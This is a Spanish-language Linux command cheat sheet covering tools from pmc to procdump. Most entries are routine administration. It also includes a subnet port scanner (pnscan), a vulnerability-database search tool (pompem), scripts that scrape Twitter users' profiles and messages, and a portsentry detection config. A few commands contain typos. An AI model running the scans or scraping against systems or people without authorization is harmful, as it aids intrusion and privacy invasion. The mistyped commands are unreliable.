$ pmc -u -b 0 "GET CURRENT_DATA_SET" (transporte UDP, domio PTP predeterminado [0] y solicita información sobre el conjunto de datos actual del reloj)
$ pmc -u -b 0 "SET PRIORITY1 128" (cambia el valor de priority1, un parámetro que influye en la elección del mejor reloj maestro)
$ pmc -u -b 0 "CMD RESET" (reinicia el reloj PTP)
$ pmc -u -b 0 "GET PORT_DATA_SET" (ver el estado del reloj)
$ pmc -i eth0 -u -b 0 "GET CURRENT_DATA_SET" (si el sistema tiene múltiples interfaces, podemos indicar cuál usar)


pmacct
Herramienta diseñada para recopilar información de tráfico [bytes y número de paquetes]. Incluye las aplicaciones: nfacctd, pmacctd, pmbgpd, pmbmpd, pmtelemetryd, sfacctd y uacctd. El archivo de configuración esta en /etc/pmacct/pmacctd.conf.
# pmacctd (activar el demonio)
# pmacct -a (muestra todos los campos de la tabla)
# pmacct -s (mostrar todas las estadísticas)
# pmacct -t (mostrar estado de la tabla de memoria)
# pmacct -e (limpiar la tabla de estadísticas)


pmap
Informa sobre el rendimiento de la memoria del sistema, tanto en general como la memoria que consume un proceso concreto.
$ pmap -d PID (consumo de memoria de las librerías, comandos y archivos que está empleando el proceso indicado)
$ pmap -x PID (Muestra información adicional y la memoria consumida por todos los archivo que corren en determinado PID
$ pmap -p PID (Mostrar ruta en el mapeo)


pmdk-tools
Paquete que proporciona al usuario un conjunto de utilidades para el análisis y manipulación fuera de línea de grupos creados por bibliotecas pmem. Incluye las aplicaciones daxio y pmempool.
# daxio --zero /dev/dax (Poner a cero el dispositivo de salida)
# daxio --input=/dev/zero --output=/dev/dax --skip=4096 (número de bytes que se deben omitir en la entrada antes de realizar una lectura)
Nota.- Un dispositivo DAX [devdax] proporciona un medio para que las aplicaciones accedan directamente al almacenamiento, sin la participación de un sistema de archivos. El beneficio del dispositivo DAX es que proporciona una granularidad de fallas garantizada. Debe haber al menos un dispositivo DAX como entrada o salida. Si no se especifica, el valor predeterminado será stdin o stdout respectivamente. Para las arquitecturas Intel 64 y AMD64, se admiten las siguientes granularidades: 4KB, 2MIB y 1GB


pmie
Motor de inferencia para métricas de rendimiento.
$ pmie archivo


pmount
Permite a usuarios sin privilegios montar dispositivos extraíbles sin una entrada /etc/fstab coincidente.
# pmount (Muestrar todos los dispositivos extraíbles montados)
# pmount --type iso9660 --read-only /dev/cdrom (Montar un CD-ROM con el tipo de sistema de archivos ISO9660 en modo solo lectura)
# pmount --type ntfs --read-write /dev/sdc (Montar un disco formateado en NTFS, forzando el acceso de lectura y escritura)
# pmount --type ext4 /dev/sda1 label (Montar un dispositivo con un tipo de sistema de archivos ext4 en /media/label)
# pumount /dev/sda1 (desmontar una particion)


pmt-
[coreutils, cutycapt, xvfb, imagemagick, twidge, html2text, wget] Pequeña suite para extraer información de usuarios de twitter. Listado de scripts de la suite: pmt-avatar.sh  pmt-followers.sh  pmt-hashtags.sh  pmt-nicks.sh  pmt-people.sh  pmt-rmessage.sh  pmt-screenshot.sh
	$ wget http://elbinario.net/wp-content/uploads/2015/05/puppetmastertweet-wip.tar5.gz
	$ tar zxf puppetmastertweet-wip.tar5.gz
	$ cd puppetmastertweet/tools
$ ./pmt-avatar -a lapipaplena (Extrae el avatar y lo coloca en la carpeta pictures)
$ ./pmt-followers.sh -f lapipaplena (Muestra el número de seguidores)
$ ./pmt-hashtags.sh -t es (Muestra listado de hashtags de un país especificado)
$ ./pmt-nicks -n (Genera un nick aleatorio)
$ ./pmt-nicks -a (Genera un nombre y un apellido)
$ ./pmt-nicks -b (Genera un nombre y dos apellidos)
$ ./pmt-nicks -c (Genera un nombre, dos apellidos y un nick acorde)
$ ./pmt-nicks -d (Genera un nombre, dos apellidos y un nick acorde en valores separados por ;)
$ ./pmt-people.sh -p Toros (lista de cuentas con relevancia en un hashtag)
$ ./pmt-rmessage.sh -m lapipaplena (Muestra mensajes de un usuario)
$ ./pmt-rmessage.sh -l lapipaplena (Muestra el último mensaje de un usuario)
$ ./pmt-screenshot.sh -f lapipaplena (captura de pantalla de un perfil. Se guarda en la carpeta screenshots)


pm-utils
Herramienta de línea de comandos de shell para suspender e hibernar la computadora. Incluye los ejecutables: pm-is-supported, pm-hibernate, pm-powersave, pm-suspend y pm-suspend-hybrid
$ pm-is-supported (muestra las acciones soportadas [--suspend | --hibernate | --suspend-hybrid])
# pm-suspend --quirk-* --help (ver las opciones de suspender)
# pm-suspend-hybrid --quirk-* --help (ver las suspension hibrida)
# pm-hibernate --help (ver los parámetros de la opción que puede especificarse para hibernar el pc)
# pm-powersave false (desactiva las funciones de ahorro de energía)
# pm-powersave true (activa las funciones de ahorro de energía)


png2html
Convertir imagenes png a html. Dado que la conversión asume 1 pixel por cada caracter, las imagenes resultantes se ven alargadas. Para una visualización más decente han de achatarse. A modo de ejemplo una imagen de 115x115 no se ha visualizado correctamente hasta 155x115.
$ png2html imagen.png texto.txt salida.html 1
El archivo texto.txt contiene una palabra, frase o párrafo con el que se confeccionará la imagen. El último número indica:
0 = fuente pequeña incompatible en algunos navegadores.
1 = fuente mediana.
2 = fuente grande.


pngcheck
Verifica la integridad de archivos PNG, JNG y MNG y opcionalmente vuelca casi toda la información. Por ejemplo, se puede usar para imprimir las estadísticas básicas sobre una imagen [dimensiones, profundidad de bits, etc.] para enumerar la información de color y transparencia en su paleta o para extraer las anotaciones de texto incrustadas.
$ pngcheck imagen.png
$ pngcheck *.png (verifica un lote de imagenes)


pngcrush
Optimizar imagenes png.
$ pngcrush imagen.png nueva_imagen.png (Uso basico)
$ pngcrush -rem allb -brute -reduce original.png modificada.png (Quitando información adicional [-rem allb], utilizando método de fuerza bruta que prueba 114 filtros y métodos compresión y selecciona el que mejor comprima la imagen [-brute] y reduciendo el tamaño de la imagen [-reduce])
$ optipng -o7 *.png (Todos las imagenes del directorio a su nivel mas alto posible)


pngmeta
Programa de filtrado que extrae metadatos de imágenes PNG y los muestra como HTML, SOIF, RDF/XML o campos y valores simples.
$ pngmeta --all --html imagen.png (Imprimir toda la información sobre el tamaño de la imagen, la profundidad, etc y salida en html.)


pngnq
Optimizacion de imagenes .png. Comprime reduciendo el número de colores disponible. El tamaño del archivo resultante es mucho menor, pero hay perdida de calidad.
$ pngnq imagen.png (No sobreescribe la imagen. Añade al nombre una extension para distinguirla [-nq8])
$ pngnq -n 256 imagen.png (Pasando de ARGB de 32 bits por píxel a formato de paleta de 256 colores, con 8 bits por píxel)
$ pngnq -n 64 imagen.png (Indicando numero de colores)


pngphoon
Crea una imagen png de la fase actual de la luna.
$ pngphoon -h 1060px -w 1060px -f lluna.png -s 50 (Los parámetros h [altura de la imagen], w [anchura] y f [archivo de salida] son obligatorios. "s" es la densidad de puntos)
$ pngphoon -h 1060px -w 1060px -f lluna.png -b (En negro la superficie de la luna no iluminada)


pngquant
Optimizacion de imagenes .png. Comprime reduciendo el número de colores disponible. El tamaño del archivo resultante es mucho menor, pero hay una perdida de calidad.
$ pngquant imagen.png
$ pngquant --quality=40-90 imagen.png (con una cualidad de 40 minima y 90 maxima)
$ pngquant *.png (todas las imágenes del directorio)
$ pngquant imagen1.png imagen2.png imagen3.png (con varias imágenes a la vez)


pngsplit
[pngcheck]. Dividir un archivo PNG, MNG o JNG en fragmentos individuales numerados.
$ pngsplit --verbose --force foto.png (mostrando mensajes y sobrescribir archivos de salida existentes)


pngtools
Conjunto de utilidades para trabajar con archivos PNG. Incluye las aplicaciones pngchunkdesc, pngchunks, pngcp y pnginfo
$ pngchunkdesc imagen.png (Los archivos PNG se basan en una serie de fragmentos que incorporan la información almacenada en el archivo de imagen. Estos fragmentos tienen nombres ASCII de cuatro caracteres, donde el caso de cada letra almacena información adicional. Este programa decodifica la información del caso en los nombres de los fragmentos y la muestra)
$ pngchunks imagen.png (imprimir información incrustada en un archivo PNG)
$ pngcp entrada.png salida.png (crear un nuevo archivo PNG, cambiado algunos atributos como las transparencias)
$ pnginfo imagen.png (muesra información sobre la imagen expecificada)


pnscan
Es un escáner de puertos de subprocesos múltiples.
$ pnscan 192.168.1 5/24 22 (escanear el puerto 22 de la red mencionada)
$ pnscan 192.168.1.5/24 1:65525 (todos los puertos de la red))
$ pnscan -w"HEAD / HTTP/1.0\r\n\r\n" -r"Server:" localhost 1:65525 (escanear todos los puertos de localhost)


podman
Herramienta para gestionar contenedores, imágenes, volúmenes montados en dichos contenedores y pods creados a partir de grupos de contenedores. Alternativa a Docker sin daemon.
$ podman run -it --rm debian:stable (entrar en una Debian limpia donde poder instalar, probar y salir sin riesgo. Con --rm cuando cierra se pierde todo)
      Resolved "debian" as an alias (/etc/containers/registries.conf.d/shortnames.conf)
      Trying to pull docker.io/library/debian:stable...
      Getting image source signatures
      Copying blob a1d865bc2cbc done   |
      Copying config 678d881964 done   |
      Writing manifest to image destination
      root@1ef1507a7b94:/#
Para salir y mantener el contenedor exit o Ctrl+D. CTRL-Z lo manda a segundo plano.
$ podman run -it --name mi_laboratorio -v $(pwd)/experimentos:/root/experimentos debian:stable (crear un entorno persistente para pruebas)
$ podman exec -it mi_laboratorio bash (desde otra terminal, salir y volver cuando se quiera)
$ podman attach (para volver a él)
$ podman attach 1ef1507a7b94 (otra forma)
$ podman volume create mi_volumen (crear un volumen)
$ podman run -it --rm -v mi_volumen:/datos debian:stable (todo lo que se guarde en /datos persistirá )
$ podman run -it --rm -v $(pwd)/mis_datos:/app debian:stable (montar un directorio local)
$ podman commit <container_id> mi_debian_personalizado (creando una imagen personalizada desde el contenedor modificado)
$ podman run -it --name mi_entorno debian:stable (crear contenedor persistente con nombre)
$ podman start -ai mi_entorno (reutilizar ese contenedor)
$ podman info (ver información del sistema incluyendo backend de red)
$ podman info | grep -A 5 "networkBackend" (ver qué backend de red está usando Podman)
$ podman info | grep -i network (verificar si Netavark está siendo usado)
$ podman ps (listar contenedores en ejecución)
$ podman ps -a (listar todos los contenedores incluidos parados)
$ podman images (listar imágenes)
$ podman rm <container_id> (eliminar contenedor)
$ podman rmi <image_id> (eliminar imagen)
$ podman run -d -p 8080:80 nginx (mapear puertos)
$ podman network create mi_red (red personalizada)
$ podman network ls (ver redes existentes si las hay)
$ podman network rm test-network (eliminar una red)
$ podman run --network mi_red mi_app
$ podman system prune -f (limpiar contenedores temporales)
$ ip link show | grep podman (ver interfaces de red creadas)
1.-
El proceso completo podría ser:
$ podman run -it --name zona_segura debian:stable (crear contenedor persistente)
$ podman stop zona_segura (parar el contenedor)
$ podman start -ai zona_segura (volver al contenedor)
2.-
Crear una red personalizada con Podman y Netavark
# podman network create mi-red
# podman network ls (listar redes)
# podman run -d --name mi-contenedor --network mi-red nginx (ejecutar contenedor en red específica)
# podman network inspect mi-red (inspeccionar configuración de red)
# podman network connect otra-red mi-contenedor (conectar contenedor existente a otra red)


policycoreutils
Este paquete contiene las utilidades principales de políticas necesarias para el funcionamiento básico de un sistema SELinux [ver]. Incluye las herramientas secon, sestatus, fixfiles, genhomedircon, load_policy, restorecon, restorecon_xattr, semodule, setfiles, setsebool y unsetfiles.
# sestatus (saber si esta activo)
# secon --pid 1 (mostrar el contexto SELinux del proceso de inicialización)
# semodule -l (lista todos los módulos)
# setsebool -P systemd_tmpfiles_manage_all on (activar un módulo)
# setsebool httpd_can_network_connect on (Activamos el permitir a Apache realizar conexiones de red. Ver comando setsebool)


polybar
Ayuda a los usuarios a crear barras de estado atractivas y altamente personalizables para su entorno de escritorio
Descargar temas:
$ git clone --depth=1 https://github.com/adi1090x/polybar-themes.git
$ cd polybar-themes
$ chmod +x setup.sh
$ ./setup.sh (crear el directorio de los temas)
$ ls ~/.config/polybar/ (ver listado de temas instalados)
$ ~/.config/polybar/launch.sh --hack (lanzar polybar con el tema "hack")
$ pkill polybar (para matar el proceso para probar nuevos temas)
Un ejemplo de como poner un script en la barra de estado:
# nano /etc/polybar/config.ini
Y añadir:
	[module/ip_externa]
	format-prefix = "IP "
	format-prefix-foreground = ${colors.primary}
	type = custom/script
	exec = ~/.config/polybar/scripts/ip_externa.sh
	interval = 1200
	tail = true
El script lo tenemos donde indica el parámetro "exec" y su contenido es:
$ nano ~/.config/polybar/scripts/ip_externa.sh
	#!/bin/bash
        wget -O - -q http://checkip.dyndns.org/ | cut -d':' -f2 | cut -d'<' -f1| cut -c2-


pom (bsdgames)
Informa de las fases de la luna.
$ pom


pompem
Herramienta diseñada para automatizar la búsqueda de vulnerabilidades en las bases de datos más importantes. Realiza búsquedas en seguridad PacketStorm, CXSecurity, ZeroDay, Vulners, base de datos de vulnerabilidades nacionales, base de datos de vulnerabilidades WPScan ...
$ pompem -s Wordpress
$ pompem -s Joomla --html (escribir el resultado en un archivo .html)
$ pompem -s "Internet Explorer,joomla,wordpress" --html
$ pompem -s FortiGate --txt (el resultado en un archivo .txt)
$ pompem -s ssh,ftp,mysql


popbugs
Encuentra errores en paquetes que se usan habitualmente.
# popbugs -d


popd
Ver pushd.


poppassd
Es un script CGI escrito para permitir a los usuarios cambiar sus contraseñas de una forma más divertida:
# poppassd
  200 poppassd v1.8.4 hello, who are you?
  user nombre_usuario
  200 Your password please.
  pass 1234567
  200 Your new password please.
  newpass 987654
  200 Password changed, thank-you.
  quit
  200 Bye.
Nota.- Como puede verse en el ejemplo anterior, las contraseñas no cifradas se transmiten a través de la red. Debido a esto, se recomienda utilizar este demonio solo para cambiar la contraseña del loopback local y bloquear todo acceso no local al puerto 106 [localhost:106], ya sea a través de /etc/hosts.deny:
# nano /etc/hosts.allow
Y colocar la linea:
ALL: 127.0.0.1
Y en:
# nano /etc/hosts.deny
ALL : 127.0.0.1:106
O con reglas de firewall apropiadas.


poppler-utils
Herramienta para obtener información de documentos PDF, convertirlos a otros formatos o manipularlos. Inlcuye las aplicaciones pdfdetach [lista o extrae archivos adjuntos], pdffonts [analizador de fuentes], pdfimages [extractor de imágenes], pdfinfo [información del documento], pdfseparate [herramienta de extracción de páginas], pdfsig [verifica firmas digitales], pdftocairo [convertidor de PDF a PNG/JPEG/PDF/PS/EPS/SVG con Cairo], pdftohtml [convertidor de PDF a HTML], pdftoppm [convertidor de imágenes de PDF a PPM/PNG/JPEG], pdftops [convertidor de PDF a PostScript], pdftotext [extracción de texto] y pdfunite [herramienta de fusión de documentos].
$ pdfunite archivo1.pdf archivo2.pdf archivo3.pdf todos.pdf (unir varios pdfs en uno)
$ pdftoppm -singlefile -f 4 -r 72 -jpeg -jpegopt quality=90 file.pdf pag4 ([-singlefile] convierte solo una página, [-f] la 4, [-r] DPI de la imagen [x, y], a jpeg y [jpegopt quality=90] 90 de calidad, el pdf de entrada y la salida)
$ pdfsig ejemplo.pdf (mostrar información sobre el firmante digital de un documento PDF)
$ pdftops ejemplo.pdf salida.ps (convierte un archivo PDF a PostScript)
$ pdfseparate ejemplo.pdf salida-%d.pf (creará nuevos archivos PDF, cada uno conteniendo una página individual del original)
$ pdftotext ejemplo.pdf salida.txt (extrae como texto un archivo PDF)
$ pdffonts ejemplo.pdf (lista las fuentes usadas en un archivo PDF)
$ pdfinfo ejemplo.pdf (muestra información general)


popularity-contest
Informa a Debian de los paquetes más populares. Normalmente esta aplicación es lanzada por cron (/etc/cron.daily/popularity-contest). El archivo de configuración se encuentra en /etc/popularity-contest.conf. Si queremos ver el listado de lo que manda a Debian:
# popularity-contest > listado


porg
Es un programa para ayudar a la gestión de paquetes de software instalados desde el código fuente. Después de la instalación de dichos paquetes, generalmente uno no tiene idea de qué se instaló y adónde fue, lo que dificulta la desinstalación del paquete en el futuro. Porg fue escrito para resolver este problema de una manera bastante sencilla. Al instalar un paquete desde las fuentes, porg encapsula el comando de instalación (por ejemplo, "make install") y guarda la información de instalación en su propia base de datos de texto sin formato.
La siguiente secuencia de comandos ejemplifica una instalación típica de un paquete llamado foo-1.3:
$ tar xvf foo-1.3.tar.gz
$ cd foo-1.3
$ ./configure
$ make
# porg -lp foo-1.3 "make install" (Especificar el nombre del paquete que se registrará y activar logs)
Después de los comandos anteriores, y siempre que todo haya ido bien, el programa foo-1.3 se instalará en el sistema y se registrará en la base de datos de porg. Se puede verificar simplemente escribiendo el siguiente comando, que enumerará los archivos instalados por el paquete:
$ porg -f foo-1.3 (activando listado [-f]. Sin nombre de archivo, lista todos los instalados mediante porg)
$ porg -i foo-1.3 (información del paquete)


postfix
Agente de transferencia de correo [MTA] ampliamente usado en Linux, encargado de recibir, enrutar y entregar correos electrónicos, tanto locales como externos.
# systemctl restart postfix (reiniciar Postfix tras cambios en la configuración en /etc/postfix/main.cf)
$ postfix start (iniciar el servicio)
$ postconf -d (mostrar valores de configuración)
$ postconf -n (solo valores personalizados)
$ postqueue -f (reintenta el envío inmediato de todos los mensajes en la cola de correo)
$ postqueue -p (lista el contenido de la cola)
$ postqueue -s (manda todos los correos a la cola)
$ postcat -q [MAIL_ID] (ver el contenido de un correo en la cola)
$ postsuper -d [MAIL_ID] (eliminar un mensaje específico de la cola de correo)
$ postsuper -d ALL (eliminar todos)


postgres
[postgresql php5-pgsql]. Gestión de base de datos. En caso de querer aceptar conexiones externas:
# nano /etc/postgresql/9.1/main/postgresql.conf
Substituir la linea:
	listen_addresses = 'localhost'
por:
	listen_addresses = '*'
1.-
Pasos previos para la creación del usuario y la base de datos:
	$ sudo -s
	# su postgres (Cambiar a la cuenta del usuario por defecto)
	$ createuser NOMBRE_DEL_USUARIO (Crear un usuario. Pregunta si con privilegios o sin [Shall the new role be a superuser? (y/n)])
	$ createdb NOMBRE_BASE_DE_DATOS -E utf8 -O NOMBRE_DEL_USUARIO (Crear una base de datos especificando propietario y codificación)
	$ psql
	postgres=# alter user NOMBRE_DEL_USUARIO with passwrd 'LA_CONTRASEÑA'; (Establecer contraseña de un usuario)
2.-
Para crear un usuario que sea el mismo que el sistema operativo y con privilegios de administrador:
	$ sudo -u postgres createuser --superuser $USER
	$ sudo -u postgres psql
	$ postgres=# \password USUARIO
3.-
Creación de un base de datos [la llamaremos "misdatos"]:
	$ createdb misdatos (Si se ha creado el mismo usuario que el sistema operativo)
	$ sudo -u postgres createdb misdatos (En caso de sólo existir el usuario por defecto [postgres])
	$ createdb (Crea una base de datos con el mismo nombre que el usuario)
	$ createdb misdatos (Crea una base de datos con un nombre concreto)
	$ dropdb misdatos (Eliminar una base de datos)
4.-
Acceso a una base de datos:
	$ sudo -u usuario psql base_de_datos (Cuando el usuario no es el mismo del sistema)
	$ psql misdatos (Entrar en el prompt de la base de datos especificada)
	misdatos=# (Prompt de la base de datos de administrador)
	misdatos=> (Prompt de la base de datos sin privilegios)
5.-
Creación de una tabla (igual que para mysql [ver]):
	CREATE TABLE usuario(
	nombre VARCHAR(20), apellido VARCHAR(20),
	profesión VARCHAR(20), sexo CHAR(1), nacimiento DATE,
	antiguedad DATE);
	misdatos=# DROP TABLE nombre_de_la_tabla; (Borrar una tabla)
	misdatos=# INSERT INTO usuario VALUES ('juan antonio', 'gomez', 'admin', 'h', '1985-10-06', '2008-03-11'); (Entrar datos en el mismo orden en el que se ha creado la tabla)
	misdatos=# SELECT * FROM usuario; (Ver el contenido de una tabla)
	misdatos=# SELECT nombre FROM usuario; (Seleccionar una columna de una tabla)
	misdatos=# SELECT * FROM usuario ORDER BY nombre; (Mostrar una tabla ordenado segun una columna)
Las metaordenes de psql son un conjunto de órdenes internas, no propiamente órdenes SQL. Todas empiezan con la barra invertida [\].
	\h (Muestra la ayuda. Pulsando "q" salimos de la ayuda)
	\? (Ver todas las ordenes internas)
	\q (Salir de psql)


portsentry
Herramienta de seguridad que detecta escaneo de puertos y permite monitorizar rastreos tipo NULL, SYN, TCP, ARP... Su configuración se realiza en el archivo /etc/portsentry/portsentry.conf, las opciones [tcp y/o udp] del demonio en /etc/default/portsentry y las máquinas y interficies a ignorar en /etc/portsentry/portsentry.ignore.static. Sin tocar del archivo de configuración el parámetro TCP_PORTS y UDC_PORTS portsentry simula que todos los especificados están abiertos, lo cual puede verificarse con un nmap:
# nmap 192.168.1.x
La configuración por defecto con la explicación a modo de comentario:
	# Puertos que se simularán abiertos y que monitorizarán ataques:
	TCP_PORTS="1,11,15,79,111,119,143,540,635,1080,1524,2000,5742,6667,12345,12346,20034,27665,31337,32771,32772,32773,32774,40421,49724,54320"
	UDP_PORTS="1,7,9,69,161,162,513,635,640,641,700,37444,34555,31335,32770,32771,32772,32773,32774,31337,54321"
	# Monitorizar los servicios del rango de puertos del 1 al especificado [1024]:
	ADVANCED_PORTS_TCP="1024"
	ADVANCED_PORTS_UDP="1024"
    # puertos excluidos del scaneo:
	ADVANCED_EXCLUDE_TCP="113,139"
	ADVANCED_EXCLUDE_UDP="520,138,137,67"
	# Archivo con ips que no queremos bloquear:
	IGNORE_FILE="/etc/portsentry/portsentry.ignore"
	# Direcciones detectadas intentando accesar puertos monitoreados:
	HISTORY_FILE="/var/lib/portsentry/portsentry.history"
	BLOCKED_FILE="/var/lib/portsentry/portsentry.blocked"
	# No resolver la ip del host atacante [con valor 1 lo resuelve]:
	RESOLVE_HOST = "0"
        # Bloquear scaneos udp y tcp. valor 0 no bloquear
	BLOCK_UDP="1"
	BLOCK_TCP="1"
	# Configurar la actuación de los distintos intentos de intrusión [0=no bloquear, 1=Bloquear y 2=Ejecutar un comando externo]:
	KILL_ROUTE="/sbin/route add -host $TARGET$ reject"
	# Opción para los atacantes insistentes [bloqueo total por TCPwrappers]:
	KILL_HOSTS_DENY="ALL: $TARGET$ : DENY"
	# qué tan rápido marca una intento fallido como un ataque. 0=paranoico, 1 y 2=permite algún error. Valores superiores descartar]
	SCAN_TRIGGER="0"
	# Comunicar un mensaje al atacante:
	PORT_BANNER="** UNAUTHORIZED ACCESS PROHIBITED *** IP LOGGED"
Ha de especificarse, si no consta ya, como mínimo en /etc/portsentry/portsentry.ignore, la ip localhost, 127.0.0.1 y las IPs de las interfaces locales si existen.
# service portsentry stop
# service portsentry start
# service portsentry status
# grep "attackalert" /var/log/syslog (ver alerta de ataques)
# grep -n Blocked /var/lib/portsentry/portsentry.history (ver historial de ips bloqueadas)
# nano /var/lib/portsentry/portsentry.blocked (ver ips bloqueadas)


potace
Utilidad para transformar mapas de bits en gráficos vectoriales suaves y escalables, permitiendo transformaciones a formatos como EPS, SVG o PDF, a partir de archivos PBM, PGM, PPM o BMP. Se utiliza comúnmente para vectorizar logotipos, firmas y dibujos escaneados, preservando trazos suaves y haciendo posible escalar sin perder calidad.
$ potrace -s imagen.bmp (genera el archivo imagen.svg vectorizado)
$ potrace imagen.bmp -b svg -o resultado.svg (cambiar el formato de salida explícitamente a SVG)
$ potrace imagen.pbm (vectorizar para EPS [por defecto] y el resultado se llama imagen.eps)
$ convert original.png imagen.bmp ; potrace -s imagen.bmp (usar junto con ImageMagick para convertir otros formatos. Así se procesan PNG y JPEG convertidos previamente a BMP)
$ potrace -s imagen.bmp --turdsize 5 --alphamax 0.5 (ajustar parámetros para mejorar el resultado. "turdsize" elimina puntos pequeños y "alphamax" modifica el umbral de esquinas)
$ potrace imagen.bmp --invert (invertir colores antes de trazar)


powerdebug
Herramienta para mostrar información sobre reguladores, sensores y relojes.
# powerdebug (de todo)
# powerdebug -s (-s sensores, -r del regulador, -c del reloj)
# powerdebug -d (volcar info por pantalla)


powerline
[fonts-powerline]. Utilidad escrita en python que muestra otra forma de ver el prompt de la shell.
$ mkdir ~/.config/powerline
$ cp -R /usr/share/powerline/* ~/.config/powerline (copiar archivos y modificarlos al gusto)
Añadir la siguientes lineas en .bashrc
	if [ -f /usr/share/powerline/bindings/bash/powerline.sh ]; then
	source /usr/share/powerline/bindings/bash/powerline.sh
	fi
Recargar la configuración:
	$ source .bashrc
para tener la misma configucación como root:
	# cp -f .bashrc /root/.bashrc
El resultado se observa al abrir una nueva terminal.


poweroff
[halt, reboot]. Apagar el ordenador. Los 3 comandos tienen las mismas opciones.
$ poweroff --halt (Detener la máquina independientemente de que comando de los tres se use)
$ poweroff --reboot (Reinicie la máquina, independientemente de cuál de los tres comandos se invoque)


powerstat
Utilidat para medir el consumo de energía de un portatil con fuente de alimentación por batería. Proporciona información sobre el consumo de energía del sistema.
$ powerstat (Mida la potencia con el valor predeterminado de 10 muestras con un intervalo de 10 segundos)
$ powerstat interval 20 (Mida la potencia con un número especificado de muestras)


powertop
Es una herramienta para diagnosticar problemas con el consumo y la administración de energía. Además de ser una herramienta de diagnóstico, también tiene un modo interactivo que puede usar para experimentar con varias configuraciones de administración de energía, en los casos en que la distribución de Linux no haya habilitado esas configuraciones. powertop informa qué componentes del sistema tienen más probabilidades de ser responsables de un consumo de energía superior al necesario, desde aplicaciones de software hasta componentes activos del sistema. Hay pantallas detalladas disponibles para los estados C y P de la CPU, la actividad del dispositivo y la actividad del software.
# powertop -t 10 --debug -c -r (generar un informe durante 10 segundose, ejecutar en modo calibración y el resultado en .html [powertop.html])


ppp
El protocolo Point-to-Point proporciona una forma estándar de transmitir datagramas a través de un enlace serie, así como una forma estándar para que las máquinas en cada extremo del enlace negocien varias características opcionales del enlace. Este paquete se utiliza más comúnmente para administrar un módem para acceso telefónico o ciertos tipos de conexiones de banda ancha. Incluye los ejecutables: plog, poff y # pon (ejecuta el archivo /etc/ppp/ppp_on_boot, si existe y es ejecutable. De lo contrario, se iniciará una conexión PPP utilizando la configuración de /etc/ppp/peers/provider)
# poff (cierra una conexión PPP)
# poff conec (Si existe más de una conexión PPP, se eliminará la que se menciona en el argumento)
# plog (muestra las últimas líneas de /var/log/ppp.log. Si ese archivo no existe, muestra las últimas líneas del archivo /var/log/syslog, pero excluyendo las líneas no generadas por pppd)
Nota.-  Para tener toda la información generada por pppd en un archivo de registro que pueda mostrar ese plog, se necesita la siguiente línea en el archivo /etc/syslog.conf:
        local2.*       -/var/log/ppp.log


ppt
Formatea un texto a cintas de papel.
$ ppt linux es un sistema genial


pr
Muestra en pantalla un archivo de texto en modo “Previsualización de impresión”
$ pr fichero.txt


prads
Es un Sistema Pasivo de Detección de Activos en Tiempo Real [Passive Real-time Asset Detection System]. Escucha pasivamente el tráfico de la red y recopila información sobre los hosts y servicios que ve. Esta información se puede utilizar para mapear la red, permitiéndo saber qué servicios y hosts están siendo activos o utilizados. Incluye la aplicaciones prads-asset-report y prads2snort.
# prads -v -u user -i eth1 (con la máxima información, del usurio "user" [por defecto root] y la interfaz eth1 [por defecto eth0] los logd se guardan por defecto en /var/log/prads-asset.log)
# prads2snort -v -i /var/log/prads-asset.log -o /etc/snort/host_attributes.xml ()
# prads-asset-report -r /var/log/prads-asset.log -w asset-report.txt (enviar el informe de log [-r] al archivo especificado [-w])


prelink
Preenlazar binarios y bibliotecas ELF compartidas para acelerar su tiempo de inicio. Precisa lanzar prelink despues de cada nueva instalación de paquetes o configurarlo en el cron.
# prelink -amR (Para equipos x86)
# prelink -aR (Para equipos x86_64)
Modificar las opciones de prelink:
# nano /etc/default/prelink
Y modificamos la línea que pone: PRELINKING=unknown por:
PRELINKING=yes
# prelink -au (Devolver el sistema a su punto de partida)


preload
Demonio que se encarga de recoger información de las aplicaciones más usadas para que en el siguiente inicio estos estén cargados en memoria acelerando el tiempo de arranque de los mismos.


prettyping
Herramienta para mostrar la latencia entre los hosts de envío y de destino. Es una envoltura de la herramienta de ping estándar con el objetivo de hacer que la salida sea más bonita, más colorida, más compacta y más fácil de leer. Prettyping ejecuta el ping estándar en segundo plano y analiza su salida, mostrando las respuestas al ping de forma gráfica mediante el uso de colores y caracteres Unicode.
$ prettyping google.com


primes
Generar números primos.
$ primes 1 100 (del 1 al 100)
$ primes 100 150 (del 100 al 150)


printenv
Para saber los valores de todas las variables de entorno predefinidas por  la shell (TERM, SHELL, PWD, LC_ALL, USER, USERNAME, HOME, LOGNAME, BROWSER, DISPLAY...).
$ printenv
$ printenv | grep "^PATH" (Sólo de la variable especificada)
$ printenv | grep "^SHELL" (lo mismo que "echo $SHELL")
$ export SHELL=/bin/sh (Modificar el valor de una variable sólo en la presente sesión. Para hacer el cambio permanente colocar la linea en .bashrc)


printf
Escribe y formatea datos
$ printf "%50s\n" | tr ' ' -  (Generar una linea discontinua)
$ printf "%s\n" ${PATH//:/\/* }  (listar aplicaciones y comandos del PATH)
$ printf "%s\n" .*  (listar archivos y directorios ocultos de la carpeta actual)
$ printf "\e[8;10;100;t" (Cambiar la medida de la  terminal)
$ printf "%s\t --> %s\n" "$A" "$B" (Dos variables en columnas tabuladas)
$ printf "%s\n" Escribir cada palabra en una "nueva linea" (Pues eso, excepto las dos últimas entrecomilladas)
$ printf "%06d\n" "$RANDOM" "$RANDOM" "$RANDOM" "$RANDOM" (Iguala las cuatro salidas de $RANDOM a 6 cifras con ceros delante[%06d])
$ printf "%-10s %-10s %s\n", $1, $2, $3 (3 variables justificadas a la izquierda, las dos primeras con 10 caracteres)
Algunas opciones:
%c (Imprime el primer carácter de una variable cadena)
%d (Imprime un número decimal)
%s (Cadena)
%b (Interpreta las secuencias de escape del argumento cadena)
%q (Escribe el argumento cadena de forma que pueda ser usado como entrada a otro comando)
%% (Escribe % literal)


prips
imprimir las direcciones IP de un rango determinado.
$ prips 192.168.1.0/24
$ prips -i 4 192.168.1.5 192.168.1.150  (solo una de cada cuatro)


privoxy
filtrar datos que se utilizan en la navegación web (cookies, encabezados...). Es importante usarlo con Tor ya que a veces el navegador ejecuta por sí mismo las resoluciones DNS y las agrega a las cabeceras de la petición http.
# nano /etc/privoxy/config
Añadir la linea:
forward-socks5 / 127.0.0.1:5060 .
Nota.- No olvidar el punto final.


procdump
Herramienta para detectar picos de utilización de CPU en una aplicación y generar un volcado de memoria [dump] durante este pico.
Lo siguiente creará un volcado de núcleo inmediatamente.
# procdump -p PID (volcado inmediato)
# procdump -n 3 -p PID (3 volcados separados por 10 segundos)
# procdump -n -s 5 -p PID (3 volcados de núcleo separados por 5 segundos)
